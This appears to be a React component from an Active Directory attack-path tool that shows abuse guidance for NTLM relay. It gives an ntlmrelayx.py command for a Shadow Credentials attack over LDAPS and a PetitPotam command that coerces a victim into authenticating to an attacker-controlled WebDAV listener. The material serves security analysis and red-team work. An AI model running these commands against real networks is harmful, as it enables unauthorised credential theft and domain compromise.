// Copyright 2025 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { Typography } from '@mui/material';
import { FC } from 'react';
import CodeController from '../CodeController/CodeController';

const LinuxAbuse: FC = () => {
    return (
        <>
            <Typography variant='body2'>
                Examples of this attack are detailed in the following blog posts:
                <li>
                    <a
                        href={
                            'https://www.guidepointsecurity.com/blog/beyond-the-basics-exploring-uncommon-ntlm-relay-attack-techniques/'
                        }>
                        Beyond the Basics: Exploring Uncommon NTLM Relay Attack Techniques
                    </a>
                </li>
                <li>
                    <a href={'https://trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022'}>
                        I’m bringing relaying back: A comprehensive guide on relaying anno 2022
                    </a>
                </li>
            </Typography>

            <Typography variant={'body2'}>
                1. Start the Relay Server The NTLM relay can be executed with{' '}
                <a href={'https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py'}>ntlmrelayx.py</a>. To
                relay to LDAP and perform a Shadow Credentials attack against the target computer:
                <CodeController>
                    {'ntlmrelayx.py -t ldaps://<Domain Controller IP> --shadow-credentials'}
                </CodeController>
            </Typography>

            <Typography variant={'body2'}>
                2. Coerce the Target Computer Several coercion methods are documented here:{' '}
                <a href={'https://github.com/p0dalirius/windows-coerced-authentication-methods'}>
                    Windows Coerced Authentication Methods
                </a>
                . Examples of tools include:
                <a href={'https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py'}>printerbug.py</a>
                <a href={'https://github.com/topotam/PetitPotam'}>PetitPotam</a>
                To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV
                Connection String format: \\SERVER_NETBIOS@PORT/PATH/TO/FILE.
                <CodeController>
                    {'Petitpotam.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS@PORT/file.txt" "VICTIM_IP"'}
                </CodeController>
            </Typography>
        </>
    );
};

export default LinuxAbuse;
